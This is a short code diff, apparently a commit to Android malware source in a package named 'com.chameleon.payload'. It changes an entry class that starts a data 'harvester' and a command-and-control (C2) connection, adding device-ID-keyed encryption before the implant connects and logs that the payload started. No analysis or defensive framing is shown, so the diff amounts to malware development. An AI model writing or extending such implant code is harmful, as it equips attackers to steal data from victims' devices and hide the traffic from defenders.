@@ -18,6 +18,10 @@ public class PayloadEntry {
         harvesterManager = new HarvesterManager(appContext);
 
         c2 = new C2Connection(appContext, harvesterManager);
+
+        // Initialize crypto with device ID for consistent key derivation
+        com.chameleon.payload.util.Crypto.init(c2.getDeviceId());
+
         c2.connect();
 
         Log.i(TAG, "Payload started successfully");
